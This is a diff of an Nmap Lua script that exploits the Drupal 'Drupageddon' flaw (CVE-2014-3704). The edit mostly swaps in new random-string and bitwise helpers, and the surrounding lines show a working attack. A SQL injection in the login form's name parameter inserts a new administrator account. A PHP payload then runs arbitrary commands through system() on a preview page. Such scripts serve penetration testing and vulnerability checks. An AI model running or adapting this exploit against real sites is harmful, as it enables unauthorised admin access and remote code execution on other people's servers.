@@ -1,4 +1,3 @@
-local bit = require "bit"
 local http = require "http"
 local shortport = require "shortport"
 local stdnse = require "stdnse"
@@ -7,6 +6,7 @@ local table = require "table"
 local url = require "url"
 local vulns = require "vulns"
 local openssl = require "openssl"
+local rand = require "rand"
 
 description = [[
 Exploits CVE-2014-3704 also known as 'Drupageddon' in Drupal. Versions < 7.32
@@ -131,12 +131,12 @@ local function phpass_encode64(input)
   while cur < count do
     local value = string.byte(input, cur)
     cur = cur + 1
-    table.insert(out, itoa64(bit.band(value, 0x3f)))
+    table.insert(out, itoa64(value & 0x3f))
 
     if cur < count then
-      value = bit.bor(value, bit.lshift(string.byte(input, cur), 8))
+      value = value | (string.byte(input, cur) << 8)
     end
-    table.insert(out, itoa64(bit.band(bit.rshift(value, 6), 0x3f)))
+    table.insert(out, itoa64((value >> 6) & 0x3f))
 
     if cur >= count then
       break
@@ -144,16 +144,16 @@ local function phpass_encode64(input)
     cur = cur + 1
 
     if cur < count then
-      value = bit.bor(value, bit.lshift(string.byte(input, cur), 16))
+      value = value | (string.byte(input, cur) << 16)
     end
-    table.insert(out, itoa64(bit.band(bit.rshift(value, 12), 0x3f)))
+    table.insert(out, itoa64((value >> 12) & 0x3f))
 
     if cur >= count then
       break
     end
     cur = cur + 1
 
-    table.insert(out, itoa64(bit.band(bit.rshift(value, 18), 0x3f)))
+    table.insert(out, itoa64((value >> 18) & 0x3f))
   end
 
   return table.concat(out)
@@ -163,7 +163,7 @@ local function gen_passwd_hash(passwd)
   local iter = 15
   local iter_char = itoa64(iter)
   local iter_count = 1<<iter
-  local salt = stdnse.generate_random_string(8)
+  local salt = rand.random_alpha(8)
 
   local md5 = openssl.md5(salt .. passwd)
   for i = 1, iter_count do
@@ -186,10 +186,10 @@ local function do_sql_query(host, port, uri, user)
   local query
 
   if user == nil then
-    user = stdnse.generate_random_string(10)
-    passwd = stdnse.generate_random_string(10)
+    user = rand.random_alpha(10)
+    passwd = rand.random_alpha(10)
     passHash = gen_passwd_hash(passwd)
-    email = stdnse.generate_random_string(8) .. '@' .. stdnse.generate_random_string(5) .. '.' .. stdnse.generate_random_string(3)
+    email = rand.random_alpha(8) .. '@' .. rand.random_alpha(5) .. '.' .. rand.random_alpha(3)
 
     stdnse.debug(1, string.format("adding admin user (username: '%s'; passwd: '%s')", user, passwd))
     sql_user = url.escape("insert into users (uid,name,pass,mail,status) select max(uid)+1,'" .. user .. "','" .. passHash .. "','" .. email .. "',1 from users;")
@@ -207,7 +207,7 @@ local function do_sql_query(host, port, uri, user)
     query = sql_admin .. sql_user
   end
 
-  local r = "name[0;" .. query .. "#%20%20]=" .. stdnse.generate_random_string(10) .. "&name[0]=" .. stdnse.generate_random_string(10) .. "&pass=" .. stdnse.generate_random_string(10) .. "&form_id=user_login&op=Log+in"
+  local r = "name[0;" .. query .. "#%20%20]=" .. rand.random_alpha(10) .. "&name[0]=" .. rand.random_alpha(10) .. "&pass=" .. rand.random_alpha(10) .. "&form_id=user_login&op=Log+in"
 
   local opt = {
     header = {
@@ -312,9 +312,9 @@ local function trigger_exploit(host, port, uri, session, cmd)
   local csrfToken = extract_CSRFtoken(res.body)
 
   stdnse.debug(1, string.format("%s", "calling preview article page & triggering exploit"))
-  local pattern = '"' .. stdnse.generate_random_string(5)
+  local pattern = '"' .. rand.random_alpha(5)
   local payload = "<?php echo '" .. pattern .. " '; system('" .. cmd .. "'); echo '".. pattern .. " '; ?>"
-  local boundary = stdnse.generate_random_string(16)
+  local boundary = rand.random_alpha(16)
   opt['header'] = {}
   opt['header']["Content-Type"] = "multipart/form-data" .. "; boundary=" .. boundary
 
